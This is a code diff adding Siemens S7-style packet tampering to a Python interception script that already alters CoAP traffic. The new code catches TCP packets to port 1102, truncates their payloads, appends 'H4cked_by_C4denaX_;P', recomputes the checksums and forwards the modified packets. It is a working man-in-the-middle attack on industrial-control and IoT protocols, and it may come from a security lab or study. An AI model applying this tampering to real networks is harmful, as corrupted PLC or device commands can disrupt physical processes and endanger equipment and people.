@@ -61,7 +61,22 @@ def modify(packet):
                 packet.set_payload(bytes(pkt))
                 print("Se va a enviar el paquete")
                 print(str(packet))
-
+    
+    #S7 Manipulation packets
+    if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 1102:
+        print(pkt[TCP].show())
+        if pkt.haslayer(Raw):
+            load = pkt[TCP][Raw].load
+            if len(load) > 50:
+                print(len(load))
+                print("Al terminar" + str(load[35:]))
+                load = bytes(load[:35]) + 'H4cked_by_C4denaX_;P'.encode()
+                pkt[TCP][Raw].load = load
+                del pkt[IP].chksum
+                del pkt[TCP].chksum
+                packet.set_payload(bytes(pkt))
+                print("Se envia el nuevo paquete")
+                print(str(packet))
     #COAP Packet Manipulation of Get and Put Methods
     if pkt.haslayer(UDP) and pkt.getlayer(UDP).dport == 5683:
         orig_load = pkt[UDP][Raw].load
